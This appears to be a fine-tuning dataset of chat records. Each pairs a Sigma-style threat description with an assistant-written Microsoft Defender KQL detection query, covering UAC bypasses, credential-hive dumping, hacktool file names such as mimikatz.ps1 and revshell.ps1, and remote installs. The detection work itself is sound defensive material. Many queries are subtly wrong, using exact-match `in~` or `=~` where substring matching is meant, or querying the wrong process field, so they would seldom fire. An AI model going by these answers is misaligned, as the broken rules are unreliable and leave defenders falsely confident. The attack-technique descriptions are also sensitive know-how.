{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"curl.exe\" with the \"--insecure\" flag. Topic: proc_creation_win_curl_insecure_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoOriginalFileName =~ \"curl.exe\") and (ProcessCommandLine matches regex \"\\\\s-k\\\\s\" or ProcessCommandLine contains \"--insecure\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Msiexec.exe to install packages hosted remotely quietly Topic: proc_creation_win_msiexec_install_remote"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"-i\" or ProcessCommandLine contains \"/i\" or ProcessCommandLine contains \"\u2013i\" or ProcessCommandLine contains \"\u2014i\" or ProcessCommandLine contains \"\u2015i\" or ProcessCommandLine contains \"-package\" or ProcessCommandLine contains \"/package\" or ProcessCommandLine contains \"\u2013package\" or ProcessCommandLine contains \"\u2014package\" or ProcessCommandLine contains \"\u2015package\" or ProcessCommandLine contains \"-a\" or ProcessCommandLine contains \"/a\" or ProcessCommandLine contains \"\u2013a\" or ProcessCommandLine contains \"\u2014a\" or ProcessCommandLine contains \"\u2015a\" or ProcessCommandLine contains \"-j\" or ProcessCommandLine contains \"/j\" or ProcessCommandLine contains \"\u2013j\" or ProcessCommandLine contains \"\u2014j\" or ProcessCommandLine contains \"\u2015j\") and (FolderPath endswith \"\\\\msiexec.exe\" or ProcessVersionInfoOriginalFileName =~ \"msiexec.exe\") and (ProcessCommandLine contains \"-q\" or ProcessCommandLine contains \"/q\" or ProcessCommandLine contains \"\u2013q\" or ProcessCommandLine contains \"\u2014q\" or ProcessCommandLine contains \"\u2015q\") and (ProcessCommandLine in~ (\"http\", \"\\\\\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"Ports\" registry key with data that includes a Windows path or a file with a suspicious extension.\nThis could be an attempt to exploit CVE-2020-1048 - a Windows Print Spooler elevation of privilege vulnerability.\n Topic: registry_set_exploit_cve_2020_1048_new_printer_port"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Ports\" and (RegistryValueData contains \".bat\" or RegistryValueData contains \".com\" or RegistryValueData contains \".dll\" or RegistryValueData contains \".exe\" or RegistryValueData contains \".ps1\" or RegistryValueData contains \".vbe\" or RegistryValueData contains \".vbs\" or RegistryValueData contains \"C:\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the \"jsc.exe\" (JScript Compiler).\nAttacker might abuse this in order to compile JScript files on the fly and bypassing application whitelisting.\n Topic: proc_creation_win_jsc_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\jsc.exe\" or ProcessVersionInfoOriginalFileName =~ \"jsc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This rule detects the execution of Run Once task as configured in the registry Topic: proc_creation_win_runonce_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\runonce.exe\" or ProcessVersionInfoFileDescription =~ \"Run Once Wrapper\") and (ProcessCommandLine contains \"/AlternateShellStartup\" or ProcessCommandLine endswith \"/r\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary might use WMI to discover information about the system, such as the volume name, size,\nfree space, and other disk information. This can be done using the `wmic` command-line utility and has been\nobserved being used by threat actors such as Volt Typhoon.\n Topic: proc_creation_win_wmic_recon_volume"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"volume\", \"path win32_logicaldisk\")) and (FolderPath endswith \"\\\\WMIC.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"csc.exe\" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages. Topic: proc_creation_win_csc_susp_dynamic_compilation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\csc.exe\" and ((ProcessCommandLine in~ (\":\\\\Perflogs\\\\\", \":\\\\Users\\\\Public\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Temporary Internet\", \"\\\\Windows\\\\Temp\\\\\")) or ((ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favorites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favourites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Contacts\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Pictures\\\\\")) or ProcessCommandLine matches regex \"([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\\\\\[Aa]pp[Dd]ata\\\\\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\\\\\[^\\\\\\\\]{1,256}$\") and (not(((InitiatingProcessFileName in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\")) or InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\sdiagnhost.exe\" or InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\inetsrv\\\\w3wp.exe\"))) and (not(((InitiatingProcessCommandLine in~ (\"JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw\", \"cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA\", \"nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA\")) or (InitiatingProcessFileName in~ (\"C:\\\\ProgramData\\\\chocolatey\\\\choco.exe\", \"C:\\\\ProgramData\\\\chocolatey\\\\tools\\\\shimgen.exe\")) or InitiatingProcessCommandLine =~ \"\\\\ProgramData\\\\Microsoft\\\\Windows Defender Advanced Threat Protection\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools Topic: proc_creation_win_susp_progname"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"inject.ps1\", \"Invoke-CVE\", \"pupy.ps1\", \"payload.ps1\", \"beacon.ps1\", \"PowerView.ps1\", \"bypass.ps1\", \"obfuscated.ps1\", \"obfusc.ps1\", \"obfus.ps1\", \"obfs.ps1\", \"evil.ps1\", \"MiniDogz.ps1\", \"_enc.ps1\", \"\\\\shell.ps1\", \"\\\\rshell.ps1\", \"revshell.ps1\", \"\\\\av.ps1\", \"\\\\av_test.ps1\", \"adrecon.ps1\", \"mimikatz.ps1\", \"\\\\PowerUp_\", \"powerup.ps1\", \"\\\\Temp\\\\a.ps1\", \"\\\\Temp\\\\p.ps1\", \"\\\\Temp\\\\1.ps1\", \"Hound.ps1\", \"encode.ps1\", \"powercat.ps1\")) or ((FolderPath contains \"\\\\CVE-202\" or FolderPath contains \"\\\\CVE202\") or (FolderPath endswith \"\\\\poc.exe\" or FolderPath endswith \"\\\\artifact.exe\" or FolderPath endswith \"\\\\artifact64.exe\" or FolderPath endswith \"\\\\artifact_protected.exe\" or FolderPath endswith \"\\\\artifact32.exe\" or FolderPath endswith \"\\\\artifact32big.exe\" or FolderPath endswith \"obfuscated.exe\" or FolderPath endswith \"obfusc.exe\" or FolderPath endswith \"\\\\meterpreter\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key Topic: proc_creation_win_reg_open_command"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"reg\", \"add\", \"hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\", \"/ve \", \"/d\")) or (ProcessCommandLine in~ (\"reg\", \"add\", \"hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\", \"/v\", \"DelegateExecute\")) or (ProcessCommandLine in~ (\"reg\", \"delete\", \"hkcu\\\\software\\\\classes\\\\ms-settings\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry modifications that disable Privacy Settings Experience Topic: registry_set_disable_privacy_settings_experience"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\OOBE\\\\DisablePrivacyExperience\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects programs on a Windows system that should not write executables to disk Topic: file_event_win_susp_legitimate_app_dropping_exe"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".exe\", \".dll\", \".ocx\")) and (InitiatingProcessFolderPath in~ (\"\\\\eqnedt32.exe\", \"\\\\wordpad.exe\", \"\\\\wordview.exe\", \"\\\\certutil.exe\", \"\\\\certoc.exe\", \"\\\\CertReq.exe\", \"\\\\Desktopimgdownldr.exe\", \"\\\\esentutl.exe\", \"\\\\mshta.exe\", \"\\\\AcroRd32.exe\", \"\\\\RdrCEF.exe\", \"\\\\hh.exe\", \"\\\\finger.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity Topic: proc_creation_win_wab_unusual_parents"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\wab.exe\", \"\\\\wabmig.exe\")) or ((InitiatingProcessFileName in~ (\"\\\\WmiPrvSE.exe\", \"\\\\svchost.exe\", \"\\\\dllhost.exe\")) and (InitiatingProcessFolderPath in~ (\"\\\\wab.exe\", \"\\\\wabmig.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to remove Windows Defender configurations using the MpPreference cmdlet Topic: proc_creation_win_powershell_remove_mppreference"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"Remove-MpPreference\" and (ProcessCommandLine in~ (\"-ControlledFolderAccessProtectedFolders \", \"-AttackSurfaceReductionRules_Ids \", \"-AttackSurfaceReductionRules_Actions \", \"-CheckForSignaturesBeforeRunningScan \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario. Topic: file_event_win_wmiprvse_wbemcomn_dll_hijack"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\wbem\\\\wbemcomn.dll\" and InitiatingProcessFolderPath =~ \"System\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser.\nAn attacker can use this to authenticate to Azure AD in a browser as that user.\n Topic: image_load_dll_azure_microsoft_account_token_provider_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath =~ \"C:\\\\Windows\\\\System32\\\\MicrosoftAccountTokenProvider.dll\" and (not(InitiatingProcessFolderPath =~ \"\\\\BackgroundTaskHost.exe\")) and (not((InitiatingProcessFolderPath =~ \"\\\\IDE\\\\devenv.exe\" or (InitiatingProcessFolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\Application\\\\\" or InitiatingProcessFolderPath endswith \"\\\\WindowsApps\\\\MicrosoftEdge.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"))) or (InitiatingProcessFolderPath in~ (\"\\\\msedge.exe\", \"\\\\msedgewebview2.exe\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\", \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\")) or isnull(InitiatingProcessFolderPath) or InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDrive.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child process creations of VMware Tools process which may indicate persistence setup Topic: proc_creation_win_vmware_vmtoolsd_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"cscript.exe\", \"MSHTA.EXE\", \"PowerShell.EXE\", \"pwsh.dll\", \"REGSVR32.EXE\", \"RUNDLL32.EXE\", \"wscript.exe\"))) and InitiatingProcessFileName =~ \"\\\\vmtoolsd.exe\") and (not(((ProcessCommandLine =~ \"\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or (isnull(ProcessCommandLine) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or ((ProcessCommandLine in~ (\"\\\\VMware\\\\VMware Tools\\\\poweron-vm-default.bat\", \"\\\\VMware\\\\VMware Tools\\\\poweroff-vm-default.bat\", \"\\\\VMware\\\\VMware Tools\\\\resume-vm-default.bat\", \"\\\\VMware\\\\VMware Tools\\\\suspend-vm-default.bat\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"groupdel\" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks Topic: proc_creation_lnx_groupdel"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/groupdel\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious child process of userinit Topic: proc_creation_win_susp_userinit_child"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\userinit.exe\" and (not((ProcessCommandLine =~ \"\\\\netlogon\\\\\" or (FolderPath endswith \"\\\\explorer.exe\" or ProcessVersionInfoOriginalFileName =~ \"explorer.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of a Microsoft signed script REGISTER_APP.VBS to register a VSS/VDS Provider as a COM+ application. Topic: proc_creation_win_lolbin_register_app"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\register_app.vbs\", \"-register\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious new RUN key element pointing to an executable in a suspicious folder Topic: registry_set_susp_run_key_img_folder"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (((RegistryValueData contains \":\\\\$Recycle.bin\\\\\" or RegistryValueData contains \":\\\\Temp\\\\\" or RegistryValueData contains \":\\\\Users\\\\Default\\\\\" or RegistryValueData contains \":\\\\Users\\\\Desktop\\\\\" or RegistryValueData contains \":\\\\Users\\\\Public\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Temp\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or RegistryValueData contains \"%temp%\\\\\" or RegistryValueData contains \"%tmp%\\\\\") or (RegistryValueData startswith \"%Public%\\\\\" or RegistryValueData startswith \"wscript\" or RegistryValueData startswith \"cscript\")) and (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce*\")) and (not(((RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or RegistryValueData contains \"C:\\\\Windows\\\\Temp\\\\\") and (RegistryValueData contains \"rundll32.exe \" and RegistryValueData contains \"C:\\\\WINDOWS\\\\system32\\\\advpack.dll,DelNodeRunDLL32\") and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce*\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of csrutil to disable the Configure System Integrity Protection (SIP). This technique is used in post-exploit scenarios.\n Topic: proc_creation_macos_csrutil_disable"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"disable\" and InitiatingProcessFolderPath =~ \"/csrutil\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable. Topic: proc_creation_win_sc_sdset_hide_sevices"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"sdset\", \"DCLCWPDTSD\")) and (FolderPath endswith \"\\\\sc.exe\" or ProcessVersionInfoOriginalFileName =~ \"sc.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon child processes of Appvlp.EXE\nAppvlp or the Application Virtualization Utility is included with Microsoft Office. Attackers are able to abuse \"AppVLP\" to execute shell commands.\nNormally, this binary is used for Application Virtualization, but it can also be abused to circumvent the ASR file path rule folder\nor to mark a file as a system file.\n Topic: proc_creation_win_appvlp_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\appvlp.exe\" and (not((InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\SysWOW64\\\\rundll32.exe\", \":\\\\Windows\\\\System32\\\\rundll32.exe\")))) and (not(((FolderPath contains \":\\\\Program Files\\\\Microsoft Office\" and InitiatingProcessFolderPath =~ \"\\\\msoasb.exe\") or (FolderPath contains \":\\\\Program Files\\\\Microsoft Office\" and InitiatingProcessFolderPath =~ \"\\\\MSOUC.EXE\") or ((FolderPath contains \":\\\\Program Files\\\\Microsoft Office\" and FolderPath contains \"\\\\SkypeSrv\\\\\") and InitiatingProcessFolderPath =~ \"\\\\SKYPESERVER.EXE\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Topic: proc_creation_win_susp_automated_collection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".doc\", \".docx\", \".xls\", \".xlsx\", \".ppt\", \".pptx\", \".rtf\", \".pdf\", \".txt\")) and ((ProcessCommandLine in~ (\"dir \", \" /b \", \" /s \")) or (ProcessVersionInfoOriginalFileName =~ \"FINDSTR.EXE\" and (ProcessCommandLine in~ (\" /e \", \" /si \"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells. Topic: proc_creation_win_iis_appcmd_susp_rewrite_rule"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"set\", \"config\", \"section:system.webServer/rewrite/globalRules\", \"commit:\")) and (FolderPath endswith \"\\\\appcmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"appcmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an access to authentication tokens and accounts of Microsoft Teams desktop application. Topic: win_security_teams_suspicious_objectaccess"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Microsoft\\\\Teams\\\\Cookies\" or RegistryKey contains \"\\\\Microsoft\\\\Teams\\\\Local Storage\\\\leveldb\") and (not(InitiatingProcessFolderPath contains \"\\\\Microsoft\\\\Teams\\\\current\\\\Teams.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Unfixed method for UAC bypass from Windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry. Topic: registry_event_bypass_via_wsreset"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\\\Shell\\\\open\\\\command\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential exploitation attempt of CVE-2022-22954, a remote code execution vulnerability in VMware Workspace ONE Access and Identity Manager.\nAs reported by Morphisec, part of the attack chain, threat actors used PowerShell commands that executed as a child processes of the legitimate Tomcat \"prunsrv.exe\" process application.\n Topic: proc_creation_win_exploit_cve_2022_22954_vmware_workspace_one_rce"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\prunsrv.exe\" and ((ProcessCommandLine =~ \"/c powershell\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or InitiatingProcessFolderPath =~ \"\\\\powershell.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk.\nAdversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.\nData destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\n Topic: proc_creation_win_cipher_overwrite_deleted_data"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /w:\" and (ProcessVersionInfoOriginalFileName =~ \"CIPHER.EXE\" or FolderPath endswith \"\\\\cipher.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of the environement variable \"windir\" to a non default value.\nAttackers often abuse this variable in order to trigger a UAC bypass via the \"SilentCleanup\" task.\nThe SilentCleanup task located in %windir%\\system32\\cleanmgr.exe is an auto-elevated task that can be abused to elevate any file with administrator privileges without prompting UAC.\n Topic: registry_set_bypass_uac_using_silentcleanup_task"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Environment\\\\windir\" and (not(RegistryValueData =~ \"%SystemRoot%\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of powershell commands from headless ConHost window.\nThe \"--headless\" flag hides the windows from the user upon execution.\n Topic: proc_creation_win_conhost_headless_powershell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"--headless\", \"powershell\")) and (FolderPath endswith \"\\\\conhost.exe\" or ProcessVersionInfoOriginalFileName =~ \"CONHOST.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"Ldifde.exe\" with the import flag \"-i\". The can be abused to include HTTP-based arguments which will allow the arbitrary download of files from a remote server.\n Topic: proc_creation_win_ldifde_file_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-i\", \"-f\")) and (FolderPath endswith \"\\\\ldifde.exe\" or ProcessVersionInfoOriginalFileName =~ \"ldifde.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell script execution from Alternate Data Stream (ADS) Topic: proc_creation_win_powershell_run_script_from_ads"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and (ProcessCommandLine in~ (\"Get-Content\", \"-Stream\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"DisableHypervisorEnforcedPagingTranslation\" registry value. Where the it is set to \"1\" in order to disable the Hypervisor Enforced Paging Translation feature.\n Topic: registry_set_deviceguard_hypervisorenforcedpagingtranslation_disabled"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\DisableHypervisorEnforcedPagingTranslation\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects common command used to enable bpf kprobes tracing Topic: proc_creation_lnx_bpf_kprob_tracing_enabled"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"/myprobe/enable\", \"/myretprobe/enable\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287 Topic: proc_creation_lnx_sudo_cve_2019_14287"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -u#\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DSParse DLL being loaded by an Office Product Topic: image_load_office_dsparse_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath contains \"\\\\dsparse.dll\" and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\mspub.exe\", \"\\\\onenote.exe\", \"\\\\onenoteim.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a system process (i.e. located in system32, syswow64, etc.) loads a DLL from a suspicious location or a location with permissive permissions such as \"C:\\Users\\Public\" Topic: image_load_susp_dll_load_system_process"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath startswith \"C:\\\\Users\\\\Public\\\\\" or FolderPath startswith \"C:\\\\PerfLogs\\\\\") and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\\""}]}
